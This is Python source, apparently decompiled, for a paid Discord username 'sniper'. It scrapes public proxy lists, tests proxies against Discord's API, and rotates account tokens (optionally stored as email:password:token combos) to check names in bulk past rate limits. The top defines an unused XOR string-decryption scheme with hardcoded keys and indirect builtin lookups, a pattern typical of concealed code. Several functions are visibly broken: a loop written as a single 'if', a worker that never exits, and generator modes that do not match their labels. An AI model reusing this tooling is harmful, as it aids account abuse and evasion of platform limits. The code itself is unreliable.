


# Alias
def ilove_you():
    iloveyou()


global DIRECT_CONNECTION
global last_error
from concurrent.futures import ThreadPoolExecutor, as_completed
import collections
import queue
import json
import os
import random
import re
import string
import sys
import threading
import time
import traceback
from pathlib import Path
from urllib.parse import quote
import requests
from requests.adapters import HTTPAdapter
from urllib3.exceptions import MaxRetryError
from urllib3.util.retry import Retry
xor_chars = lambda *a: ''.join(map(chr, [x ^ 72 for x in a]))
builtins_dict = getattr(__builtins__, '__dict__', __builtins__)
ord_fn = builtins_dict['ord']
seed_hex = '19162b5a338bf696544736684b0ae649166c79007c1355f6b07f79967c7752d8'
seed_hash = 0
for _ in seed_hex:
    seed_hash = 3096591494111274989
getattr_fn = builtins_dict['getattr']
import_fn = builtins_dict['__import__']
hashlib_mod = import_fn('hashlib')
sha256_digest = lambda d: getattr_fn(getattr_fn(hashlib_mod, 'sha256')(d), 'digest')()
to_utf8 = lambda t: getattr_fn(t, 'encode')('utf-8')
key_bytes = b'\x06\x81\x05\x11:9cF}\xe43\xa5\xb2b\xb4\xd8\xb6t\xdf\xb6q\xa4\xdf\x9eH\x15\x92\x18<2m\xd2'
bytes_type = builtins_dict['bytes']
bytearray_type = builtins_dict['bytearray']
int_to_bytes = lambda v, m: getattr_fn(v, 'to_bytes')(m, 'big')
decode_utf8 = lambda b: getattr_fn(b, 'decode')('utf-8', 'surrogatepass')
def random_bytes(length, seed):
    out = bytearray()
    i = 0
    if len(out) < length:
        out += sha256_digest(seed + int_to_bytes(i, 8))
        i += 1
    else:
        return bytes_type(out[:length])
decode_cache = {}
def decrypt_string(data, key):
    cache_key = (data, key)
    if cache_key in decode_cache:
        return decode_cache[cache_key]
    else:
        dec = decode_utf8(bytes_type((a ^ b for a, b in zip(data, random_bytes(len(data), key_bytes + key)))))
        decode_cache[cache_key] = dec
        return dec
def decrypt_string_alt(data, key):
    cache_key = (data, key)
    if cache_key in decode_cache:
        return decode_cache[cache_key]
    else:
        alt_key = b'\xd2m2<\x18\x92\x15H\x9e\xdf\xa4q\xb6\xdft\xb6\xd8\xb4b\xb2\xa53\xe4}Fc9:\x11\x05\x81\x06' + key
        dec = decode_utf8(bytes_type((a ^ b for a, b in zip(data, random_bytes(len(data), alt_key)))))
        decode_cache[cache_key] = dec
        return dec
VERSION = '2.3'
DEVELOPER = 'emtdin'
BUILD = 'paid'
try:
    sys.stdout.reconfigure(encoding='utf-8')
    sys.stderr.reconfigure(encoding='utf-8')
except Exception:
    pass
if os.name == 'nt':
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.GetStdHandle((-11))
        mode = ctypes.c_ulong()
        kernel32.GetConsoleMode(handle, ctypes.byref(mode))
        kernel32.SetConsoleMode(handle, mode.value | 4)
    except Exception:
        pass
BASE_DIR = Path(__file__).resolve().parent
DATA_DIR = BASE_DIR / 'data'
LOG_DIR = BASE_DIR / 'logs'
RESULTS_DIR = BASE_DIR / 'results'
for d in (DATA_DIR, LOG_DIR, RESULTS_DIR):
    d.mkdir(parents=True, exist_ok=True)
DEFAULT_FILES = {DATA_DIR / 'config.json': '{}', DATA_DIR / 'proxies.txt': '', DATA_DIR / 'tokens.txt': '', DATA_DIR / 'names_to_check.txt': '', DATA_DIR / 'vanity_to_check.txt': '', LOG_DIR / 'log.txt': '', LOG_DIR / 'error.txt': '', RESULTS_DIR / 'hits.txt': '', RESULTS_DIR / 'vanity_hits.txt': ''}
for path, content in DEFAULT_FILES.items():
    if not path.exists():
        path.write_text(content, encoding='utf-8')
try:
    import socks
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False
class Colors:
    RESET = '[0m'
    BOLD = '[1m'
    WHITE = '[38;2;255;255;255m'
    SNOW = '[38;2;235;238;245m'
    SILVER = '[38;2;190;195;205m'
    GREY = '[38;2;130;135;145m'
    DIM = '[38;2;90;95;105m'
    CYAN = '[38;2;120;215;235m'
    BLUE = '[38;2;130;170;255m'
    GREEN = '[38;2;120;230;160m'
    RED = '[38;2;255;130;140m'
    GREEN_D = '[38;2;40;150;80m'
    RED_D = '[38;2;180;45;55m'
    YELLOW = '[38;2;240;215;130m'
    GOLD = '[38;2;255;200;80m'
    PURPLE = '[38;2;190;140;255m'
    BOX = '[38;2;70;75;85m'
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
def print_flush(text=''):
    print(text, flush=True)
def line(ch='─', width=64, color=Colors.BOX):
    print_flush(f'{color}{ch * width}{Colors.RESET}')
def banner():
    ascii_art = [' ________  ________  ________          ________  ________   ___  ________  _______   ________     ', '|\\   __  \\|\\   __  \\|\\   __  \\        |\\   ____\\|\\   ___  \\|\\  \\|\\   __  \\|\\  ___ \\ |\\   __  \\    ', '\\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\|\\  \\       \\ \\  \\___|\\ \\  \\\\ \\  \\ \\  \\ \\  \\|\\  \\ \\   __/|\\ \\  \\|\\  \\   ', ' \\ \\   ____\\ \\   _  _\\ \\  \\\\  \\       \\ \\_____  \\ \\  \\\\ \\  \\ \\  \\ \\   ____\\ \\  \\_|/_\\ \\   _  _\\  ', '  \\ \\  \\___|\\ \\  \\\\  \\\\ \\  \\\\  \\       \\|____|\\  \\ \\  \\\\ \\  \\ \\  \\ \\  \\___|\\ \\  \\_|\\ \\ \\  \\\\  \\| ', '   \\ \\__\\    \\ \\__\\\\ _\\\\ \\_______\\        ____\\_\\  \\ \\__\\\\ \\__\\ \\__\\ \\__\\    \\ \\_______\\ \\__\\\\ _\\ ', '    \\|__|     \\|__|\\|__|\\|_______|       |\\_________\\|__| \\|__|\\|__|\\|__|     \\|_______|\\|__|\\|__|', '                                         \\|_________|                                             ', '                                                                                                  ']
    gradient = [Colors.WHITE, Colors.SNOW, Colors.SILVER, Colors.GREY, Colors.DIM, Colors.DIM, Colors.DIM, Colors.DIM, Colors.DIM, Colors.DIM, Colors.DIM]
    for i, line_txt in enumerate(ascii_art):
        color = gradient[i] if i < len(gradient) else Colors.DIM
        print_flush(color + line_txt + Colors.RESET)
    line('─', 64)
    print_flush(f' {Colors.WHITE}Version {VERSION}{Colors.RESET}      {Colors.SILVER}Developer: {DEVELOPER}{Colors.RESET}      {Colors.GREY}Build: {BUILD}{Colors.RESET}')
    line('─', 64)
def panel(title, rows):
    width = 64
    print_flush(f'{Colors.BOX}╭{'─' * (width - 2)}╮{Colors.RESET}')
    print_flush(f'{Colors.BOX}│{Colors.RESET} {Colors.BOLD}{Colors.WHITE}{title.center(width - 4)}{Colors.RESET} {Colors.BOX}│{Colors.RESET}')
    print_flush(f'{Colors.BOX}├{'─' * (width - 2)}┤{Colors.RESET}')
    for left, right in rows:
        left_part = f'  {Colors.SILVER}{left}{Colors.RESET}'
        right_part = f'{Colors.WHITE}{right}{Colors.RESET}'
        padding = width - 4 - len(left) - len(str(right))
        if padding < 1:
            padding = 1
        print_flush(f'{Colors.BOX}│{Colors.RESET}{left_part}{' ' * padding}{right_part}  {Colors.BOX}│{Colors.RESET}')
    print_flush(f'{Colors.BOX}╰{'─' * (width - 2)}╯{Colors.RESET}')
def menu(options):
    line('─', 64)
    for key, label, desc in options:
        print_flush(f'  {Colors.WHITE}[{key:>2}]{Colors.RESET}  {Colors.WHITE}{label}{Colors.RESET}')
        if desc:
            print_flush(f'       {Colors.DIM}{desc}{Colors.RESET}')
    line('─', 64)
def prompt(prompt_text, default=None):
    default_str = f' {Colors.DIM}(Recommended: {default}){Colors.RESET} ' if default is not None else ' '
    inp = input(f'  {Colors.WHITE}{prompt_text}{Colors.RESET}{default_str}{Colors.WHITE}›{Colors.RESET} ').strip()
    if not inp and default is not None:
        return str(default)
    else:
        return inp
def confirm(prompt_text):
    resp = input(f'  {Colors.WHITE}{prompt_text} (y/n){Colors.RESET} {Colors.WHITE}›{Colors.RESET} ').strip().lower()
    return resp in ('y', 'yes', '1', 'true', 't', '')
def status(kind, msg):
    prefix = {'ok': f'{Colors.WHITE}[+]{Colors.RESET}', 'bad': f'{Colors.RED}[-]{Colors.RESET}', 'info': f'{Colors.WHITE}[*]{Colors.RESET}', 'warn': f'{Colors.YELLOW}[!]{Colors.RESET}'}.get(kind, f'{Colors.GREY}[ ]{Colors.RESET}')
    print_flush(f'  {prefix} {msg}')
class ConfigStore:
    PATH = DATA_DIR / 'config.json'
    def __init__(self):
        self._data = self._read()
    def _read(self):
        try:
            return json.loads(self.PATH.read_text(encoding='utf-8') or '{}')
        except Exception:
            return {}
    def _write(self):
        self.PATH.write_text(json.dumps(self._data, indent=4), encoding='utf-8')
    def get(self, key, default=None):
        return self._data.get(key, default)
    def set(self, key, value):
        self._data[key] = value
        self._write()
    def all(self):
        return self._data
config = ConfigStore()
class Logger:
    def __init__(self, path, buf=65536):
        self._f = open(path, 'a', encoding='utf-8', buffering=buf)
        self._lock = threading.Lock()
    def log(self, msg):
        with self._lock:
            self._f.write(f'{time.strftime('%H:%M:%S')} | {msg}\n')
            self._f.flush()
    def flush(self):
        with self._lock:
            self._f.flush()
log = Logger(LOG_DIR / 'log.txt')
log.log('session started')
error_log = Logger(LOG_DIR / 'error.txt')
http = requests.Session()
http_adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=Retry(total=1, connect=1, read=0, redirect=0, backoff_factor=0.1, status_forcelist=[502, 503, 504]), pool_block=False)
http.mount('http://', http_adapter)
http.mount('https://', http_adapter)
def format_proxy(raw):
    raw = raw.strip()
    if raw.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return raw
    else:
        parts = raw.split(':')
        if len(parts) == 4:
            if parts[1].isdigit() and '.' in parts[0]:
                ip, port, user, pwd = parts
            else:
                user, pwd, ip, port = parts
            return f'http://{quote(user, safe='')}:{quote(pwd, safe='')}@{ip}:{port}'
        else:
            return f'http://{raw}'
def parse_proxy(raw):
    return raw.strip().lower().startswith(('socks4://', 'socks5://'))
class ProxyPool:
    def __init__(self):
        self._lock = threading.Lock()
        self._proxies = []
        self._bad = set()
        self._cooldowns = {}
        self._mtime = 0
        self.reload()
    def reload(self):
        try:
            self._mtime = (DATA_DIR / 'proxies.txt').stat().st_mtime
        except Exception:
            self._mtime = 0
        raw = (DATA_DIR / 'proxies.txt').read_text(encoding='utf-8-sig').splitlines()
        seen = set()
        unique = []
        for p in raw:
            p = p.strip()
            if p and p not in seen:
                    seen.add(p)
                    unique.append(p)
        with self._lock:
            self._proxies = unique
            self._bad.clear()
            self._cooldowns.clear()
    def _maybe_reload(self):
        try:
            mtime = (DATA_DIR / 'proxies.txt').stat().st_mtime
        except Exception:
            return None
        if mtime != self._mtime:
            self.reload()
    def get(self):
        if DIRECT_CONNECTION:
            return None
        with self._lock:
            now = time.time()
            available = [p for p in self._proxies if p not in self._bad and now >= self._cooldowns.get(p, 0)]
            if available:
                return random.choice(available)
        self._maybe_reload()
        with self._lock:
            now = time.time()
            available = [p for p in self._proxies if p not in self._bad and now >= self._cooldowns.get(p, 0)]
            if available:
                return random.choice(available)
        return None
    def mark_bad(self, proxy):
        with self._lock:
            if proxy:
                self._bad.add(proxy)
    def mark_cooldown(self, proxy, seconds):
        with self._lock:
            if proxy:
                self._cooldowns[proxy] = time.time() + seconds
    @property
    def proxies(self):
        with self._lock:
            return self._proxies[:]
    def count(self):
        with self._lock:
            return len(self._proxies)
    def alive_count(self):
        with self._lock:
            now = time.time()
            return sum((1 for p in self._proxies if p not in self._bad and now >= self._cooldowns.get(p, 0)))
    def dead_count(self):
        with self._lock:
            return len(self._bad)
    def verify(self, threads=500, timeout=10, rate=0, max_ms=None):
        if self.count() == 0:
            return (0, 0)
        else:
            total = self.count()
            good = []
            good_lock = threading.Lock()
            done = [0]
            done_lock = threading.Lock()
            q = queue.Queue()
            for p in self.proxies:
                q.put(p)
            stop_event = threading.Event()
            class RateLimiter:
                def __init__(self, r):
                    self.rate = float(r) if r > 0 else 0
                    self.tokens = self.rate
                    self.updated = time.time()
                    self.lock = threading.Lock()
                def acquire(self):
                    if self.rate <= 0:
                        return None
                    else:
                        while True:
                            with self.lock:
                                now = time.time()
                                self.tokens = min(self.rate, self.tokens + (now - self.updated) * self.rate)
                                self.updated = now
                                if self.tokens >= 1:
                                    self.tokens -= 1
                                    return
                                else:
                                    sleep_time = (1 - self.tokens) / self.rate if self.rate > 0 else 0.1
                            time.sleep(sleep_time)
            limiter = RateLimiter(rate)
            expected_time = total / rate if rate > 0 else 0
            output_lock = threading.Lock()
            def progress_printer():
                start = time.time()
                deadline = start + expected_time + timeout + 15
                while time.time() < deadline and (not stop_event.is_set()):
                    with done_lock:
                        d = done[0]
                    if d >= total:
                        break
                    pct = d / total * 100 if total else 0
                    remaining = total - d
                    bar_len = 30
                    filled = int(bar_len * d / total) if total else 0
                    bar = '█' * filled + '░' * (bar_len - filled)
                    with output_lock:
                        sys.stdout.write(f'\r  {Colors.DIM}[{Colors.WHITE}{bar}{Colors.DIM}]{Colors.RESET} {Colors.WHITE}{d}{Colors.RESET}/{Colors.WHITE}{total}{Colors.RESET} ({pct:.0f}%) remaining: {Colors.WHITE}{remaining}{Colors.RESET}')
                        sys.stdout.flush()
                    time.sleep(0.3)
                with output_lock:
                    sys.stdout.write('\r                                                                                \r')
                    sys.stdout.flush()
            def worker():
                session = requests.Session()
                session.mount('https://', HTTPAdapter(pool_maxsize=1, pool_block=False))
                while True:
                    try:
                        p = q.get(timeout=1)
                    except queue.Empty:
                        pass
                        session.close()
                    proxy_url = format_proxy(p)
                    ok = False
                    t0 = time.time()
                    try:
                        limiter.acquire()
                        resp = session.get('https://discord.com/api/v9/users/@me', headers={'User-Agent': Checker.HEADERS['User-Agent']}, proxies={'http': proxy_url, 'https': proxy_url}, timeout=timeout)
                        ok = resp.status_code in (200, 400, 401, 403, 429)
                    except Exception:
                        ok = False
                    ms = int((time.time() - t0) * 1000)
                    if ok and max_ms is not None and (ms > max_ms):
                                ok = False
                    if ok:
                        with good_lock:
                            good.append(p)
                    with done_lock:
                        done[0] += 1
                    q.task_done()
            threads = min(max(threads, 50), total)
            progress = threading.Thread(target=progress_printer, daemon=True)
            progress.start()
            workers = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
            for t in workers:
                t.start()
            deadline = time.time() + expected_time + timeout + 20
            if done[0] < total and time.time() < deadline:
                time.sleep(0.5)
            else:
                stop_event.set()
                for t in workers:
                    t.join(timeout=5)
                progress.join(timeout=2)
                alive = len(good)
                dead = total - alive
                with self._lock:
                    if alive:
                        self._proxies = good
                        self._bad.clear()
                        self._cooldowns.clear()
                        if config.get('remove_proxies'):
                            (DATA_DIR / 'proxies.txt').write_text('\n'.join(good), encoding='utf-8')
                            self._mtime = (DATA_DIR / 'proxies.txt').stat().st_mtime
                    else:
                        self._proxies = []
                        self._bad.clear()
                        self._cooldowns.clear()
                return (alive, dead)
proxies = ProxyPool()
PROXY_SETTINGS = {'rate': 300, 'timeout': 6, 'max_ms': 3000}
DIRECT_CONNECTION = False
def clamp(v_threads=None):
    p = PROXY_SETTINGS
    if v_threads is None:
        v_threads = min(max(100, proxies.count() // 4), 2000)
    return proxies.verify(threads=v_threads, timeout=p['timeout'], rate=p['rate'], max_ms=p['max_ms'])
def proxy_settings_menu():
    n = proxies.count()
    if n == 0:
        return (0, 0)
    else:
        print_flush('  Proxy speed (how fast it must respond):')
        print_flush(f'  {Colors.WHITE}[1]{Colors.RESET} {Colors.WHITE}Fast{Colors.RESET}   {Colors.DIM}(<= 800ms, strict timeout){Colors.RESET}')
        print_flush(f'  {Colors.WHITE}[2]{Colors.RESET} {Colors.WHITE}Normal{Colors.RESET} {Colors.DIM}(<= 2500ms){Colors.RESET}')
        print_flush(f'  {Colors.WHITE}[3]{Colors.RESET} {Colors.WHITE}Slow{Colors.RESET}   {Colors.DIM}(any){Colors.RESET}')
        speed_choice = (prompt('Proxy speed', '1') or '1').strip().lower()
        if speed_choice in ('1', 'fast'):
            timeout, speed_max_ms, speed_label = (3, 800, 'Fast')
        else:
            if speed_choice in ('3', 'slow'):
                timeout, speed_max_ms, speed_label = (12, None, 'Slow')
            else:
                timeout, speed_max_ms, speed_label = (6, 2500, 'Normal')
        print_flush('  Proxy strength (quality, like paid proxies):')
        print_flush(f'  {Colors.WHITE}[1]{Colors.RESET} {Colors.WHITE}Strong{Colors.RESET}  {Colors.DIM}(<= 1000ms, premium){Colors.RESET}')
        print_flush(f'  {Colors.WHITE}[2]{Colors.RESET} {Colors.WHITE}Medium{Colors.RESET} {Colors.DIM}(<= 3000ms){Colors.RESET}')
        print_flush(f'  {Colors.WHITE}[3]{Colors.RESET} {Colors.WHITE}Weak{Colors.RESET}    {Colors.DIM}(any working proxy){Colors.RESET}')
        strength_choice = (prompt('Proxy strength', '1') or '1').strip().lower()
        if strength_choice in ('1', 'strong'):
            strength_max_ms, strength_label = (1000, 'Strong')
        else:
            if strength_choice in ('3', 'weak'):
                strength_max_ms, strength_label = (None, 'Weak')
            else:
                strength_max_ms, strength_label = (3000, 'Medium')
        if speed_max_ms is not None and strength_max_ms is not None:
            max_ms = min(speed_max_ms, strength_max_ms)
        else:
            max_ms = speed_max_ms if speed_max_ms is not None else strength_max_ms
        PROXY_SETTINGS.update({'rate': 300, 'timeout': timeout, 'max_ms': max_ms})
        status('info', f'Verify: {Colors.WHITE}300/s{Colors.RESET} | speed {Colors.WHITE}{speed_label}{Colors.RESET} | strength {Colors.WHITE}{strength_label}{Colors.RESET} | max response {Colors.WHITE}{(max_ms if max_ms else 'any')} ms{Colors.RESET}')
        return clamp()
def scrape_proxies():
    urls = ['https://raw.githubusercontent.com/TheSpeedX/SOCKS-Proxy/master/http.txt', 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-Proxy/master/socks4.txt', 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-Proxy/master/socks5.txt', 'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt', 'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt', 'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt', 'https://raw.githubusercontent.com/jetkai/proxy-list/master/online-proxies/txt/proxies.txt', 'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt', 'https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt', 'https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt', 'https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies.txt', 'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy-list.txt', 'https://raw.githubusercontent.com/Anonym0usWork1221/Proxy-List/main/proxy-list.txt', 'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt', 'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt', 'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt', 'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt', 'https://raw.githubusercontent.com/UserR3X/proxy-list/main/data/proxy-list.txt', 'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt', 'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks4.txt', 'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt', 'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt', 'https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt', 'https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks4.txt', 'https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt', 'https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt', 'https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt', 'https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt', 'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt', 'https://raw.githubusercontent.com/hookzof/socks5_list/master/sub.txt', 'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt', 'https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt', 'https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt', 'https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt', 'https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt', 'https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt', 'https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt', 'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies.txt', 'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt', 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all', 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000', 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000', 'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000', 'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=socks4&timeout=10000', 'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=socks5&timeout=10000', 'https://www.proxy-list.download/api/v1/get?type=http', 'https://www.proxy-list.download/api/v1/get?type=https', 'https://www.proxy-list.download/api/v1/get?type=socks4', 'https://www.proxy-list.download/api/v1/get?type=socks5', 'https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http', 'https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks4', 'https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks5', 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http', 'https://free-proxy-list.net/', 'https://www.sslproxies.org/', 'https://www.us-proxy.org/', 'https://www.socks-proxy.net/', 'https://proxyscrape.com/free-proxy-list', 'https://www.proxy-list.download/HTTP-Proxy', 'https://www.proxy-list.download/SOCKS4-Proxy', 'https://www.proxy-list.download/SOCKS5-Proxy', 'https://openproxy.space/list/http', 'https://www.proxydocker.com/en/proxy-list/', 'https://premproxy.com/list/', 'https://www.cool-proxy.net/proxies/http_proxy_list']
    found = set()
    lock = threading.Lock()
    def extract_proxies(text):
        proxies_set = set()
        if text[:1] in ('[', '{'):
            try:
                data = json.loads(text)
                def recurse(obj):
                    if isinstance(obj, dict):
                        if 'ip' in obj and 'port' in obj:
                                proxies_set.add(f'{obj['ip']}:{obj['port']}')
                        for v in obj.values():
                            recurse(v)
                    else:
                        if isinstance(obj, list):
                            for v in obj:
                                recurse(v)
                recurse(data)
            except Exception:
                pass
        for ip, port in re.findall('((?:\\d{1,3}\\.){3}\\d{1,3})</t[dD]>\\s*<t[dD][^>]*>\\s*(\\d{2,5})', text):
            proxies_set.add(f'{ip}:{port}')
        for ip, port in re.findall('(?<!\\d)((?:\\d{1,3}\\.){3}\\d{1,3}):(\\d{2,5})(?!\\d)', text):
            proxies_set.add(f'{ip}:{port}')
        return proxies_set
    def fetch(url):
        session = requests.Session()
        try:
            resp = session.get(url, timeout=12, headers={'User-Agent': Checker.HEADERS['User-Agent']})
            session.close()
            if resp.status_code == 200:
                return extract_proxies(resp.text)
            return set()
        except Exception:
            return set()
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(fetch, u) for u in urls]
        for f in as_completed(futures):
            try:
                result = f.result()
            except Exception:
                result = set()
            with lock:
                found.update(result)
    if found:
        existing = []
        if (DATA_DIR / 'proxies.txt').exists():
            existing = (DATA_DIR / 'proxies.txt').read_text(encoding='utf-8-sig').splitlines()
        seen = set()
        merged = []
        for p in list(existing) + sorted(found):
            p = p.strip()
            if p and p not in seen:
                    seen.add(p)
                    merged.append(p)
        (DATA_DIR / 'proxies.txt').write_text('\n'.join(merged), encoding='utf-8')
    return len(found)
class TokenPool:
    def __init__(self, filename='tokens.txt'):
        self._lock = threading.Lock()
        self._tokens = []
        self._token_map = {}
        self._bad = set()
        self._cooldowns = {}
        self._filename = filename
        self.reload()
    def reload(self):
        path = DATA_DIR / self._filename
        if not path.exists():
            path.write_text('', encoding='utf-8')
        raw = path.read_text(encoding='utf-8-sig').splitlines()
        with self._lock:
            self._tokens = []
            self._token_map = {}
            for line in raw:
                line = line.strip()
                if not line:
                    continue
                else:
                    parts = line.split(':')
                    if len(parts) >= 3:
                        email, pwd, token = (parts[0].strip(), parts[1].strip(), parts[2].strip())
                        self._tokens.append(token)
                        self._token_map[token] = {'email': email, 'password': pwd}
                    else:
                        if len(parts) == 2:
                            token, pwd = (parts[0].strip(), parts[1].strip())
                            self._tokens.append(token)
                            self._token_map[token] = {'email': None, 'password': pwd}
                        else:
                            token = line
                            self._tokens.append(token)
                            self._token_map[token] = None
            self._bad.clear()
            self._cooldowns.clear()
    def get(self):
        with self._lock:
            pass
        now = time.time()
        available = [t for t in self._tokens if t not in self._bad and now >= self._cooldowns.get(t, 0)]
        if available:
            return random.choice(available)
    def get_account(self, token):
        with self._lock:
            return self._token_map.get(token)
    def mark_bad(self, token):
        with self._lock:
            if token:
                self._bad.add(token)
    def mark_cooldown(self, token, seconds):
        with self._lock:
            if token:
                self._cooldowns[token] = time.time() + seconds
    @property
    def tokens(self):
        with self._lock:
            return self._tokens[:]
    def count(self):
        with self._lock:
            return len(self._tokens)
    def active_count(self):
        with self._lock:
            now = time.time()
            return sum((1 for t in self._tokens if t not in self._bad and now >= self._cooldowns.get(t, 0)))
tokens = TokenPool('tokens.txt')
claim_tokens = TokenPool('tokensautoclaim.txt')
def verify_proxy_list():
    bad = []
    for t in tokens.tokens:
        valid = False
        for attempt in range(3):
            try:
                resp = http.get('https://discord.com/api/v9/users/@me', headers={'Authorization': t, 'User-Agent': Checker.HEADERS['User-Agent']}, timeout=10)
                if resp.status_code == 200:
                    valid = True
                    break
                elif resp.status_code == 401:
                    bad.append((t[:20] + '...', 'Unauthorized (401)'))
                    break
                elif resp.status_code == 403:
                    valid = True
                    break
                elif resp.status_code == 429:
                    retry_after = 5
                    try:
                        retry_after = resp.json().get('retry_after', 5)
                    except Exception:
                        pass
                    tokens.mark_cooldown(t, retry_after)
                    time.sleep(min(float(retry_after), 10))
            except Exception:
                time.sleep(2)
        if not valid:
            if not any(b[0] == t[:20] + '...' for b in bad):
                bad.append((t[:20] + '...', 'Unreachable'))
    return len(tokens.tokens) - len(bad), len(tokens.tokens), bad

class UsernameGenerator:
    LETTERS = string.ascii_lowercase
    DIGITS = string.digits
    VOWELS = 'aeiou'
    POOL = LETTERS + DIGITS + '_.'
    MODES = {1: ('Letters only', 'abc, xyz'), 2: ('Alphanumeric', 'a1b2, xyz9'), 3: ('Double letters', 'vvss, ddff'), 4: ('Period ending', 'akk., wia.'), 5: ('Period start', '.abc, .xyz'), 6: ('Underscore start', '_abc, _xyz'), 7: ('Underscore end', 'abc_, xyz_'), 8: ('Triple + diff', 'aaae, bbbx'), 9: ('Underscore mix', 'a_b_c, x_y'), 10: ('Vowel-heavy', 'baki, zito'), 11: ('Palindrome', 'abccba'), 12: ('Random dot', 'a.b.c, xy.z'), 13: ('Random underscore', 'a_b_c, x_y'), 14: ('Random dot + _', 'a.b_c, x._y'), 15: ('Random mix', 'recommended'), 16: ('Fancy words', 'stayhidden, trustnone')}
    FANCY_FIRST = ['stay', 'keep', 'trust', 'know', 'move', 'never', 'born', 'still', 'silent', 'better', 'beyond', 'no', 'all', 'one', 'worth', 'cold', 'mad', 'real', 'deep', 'dark', 'fast', 'raw', 'pure', 'true', 'bold', 'calm', 'wise', 'kind', 'sick', 'wild', 'free', 'lost', 'brave', 'sharp', 'steel', 'iron', 'stone', 'black', 'white', 'gold', 'red', 'blue', 'lone', 'rare', 'vast', 'odd', 'old', 'new', 'high', 'low', 'next', 'last', 'first', 'fair', 'just', 'still', 'half', 'full', 'long', 'hard', 'soft', 'deep', 'wide', 'flat']
    FANCY_SECOND = ['hidden', 'less', 'none', 'wise', 'cold', 'going', 'fold', 'ready', 'here', 'day', 'real', 'limits', 'more', 'move', 'alone', 'mercy', 'born', 'heart', 'soul', 'mind', 'fire', 'rain', 'wind', 'snow', 'light', 'dark', 'code', 'rush', 'zone', 'edge', 'rise', 'fall', 'walk', 'run', 'fly', 'swim', 'hunt', 'kill', 'fight', 'strike', 'break', 'burn', 'heal', 'hope', 'fear', 'pain', 'gain', 'loss', 'dream', 'sleep', 'wake', 'speak', 'think', 'feel', 'live', 'die', 'strong', 'fast', 'slow', 'high', 'deep', 'wide', 'safe', 'free', 'lost', 'found', 'safe', 'wild', 'cold', 'warm', 'cool', 'hot', 'blue', 'red', 'gold', 'dark', 'light', 'steel', 'stone', 'iron']
    @staticmethod
    def generate(mode, length, count=50000):
        names = set()
        attempts = 0
        max_attempts = count * 50
        def add(name):
            nonlocal attempts
            attempts += 1
            if 1 <= len(name) <= length:
                names.add(name)
        while len(names) < count and attempts < max_attempts:
            if mode == 1:
                add(''.join(random.choices(VanityGenerator.LETTERS, k=length)))
            elif mode == 2:
                add(''.join(random.choices(VanityGenerator.LETTERS + VanityGenerator.DIGITS, k=length)))
            elif mode == 3:
                add(''.join(random.choices(VanityGenerator.LETTERS + '-', k=length)))
            elif mode == 4:
                add(''.join(random.choices(VanityGenerator.LETTERS + '_', k=length)))
            elif mode == 5:
                actual_len = random.randint(2, min(3, length))
                add(''.join(random.choices(VanityGenerator.LETTERS, k=actual_len)))
            elif mode == 6:
                add(''.join(random.choices(VanityGenerator.POOL, k=length)))
            elif mode == 7:
                prefix = VanityGenerator._prefix
                if not prefix:
                    break
                remaining = max(1, length - len(prefix))
                digits_len = random.randint(1, remaining // 2) if remaining > 1 else 1
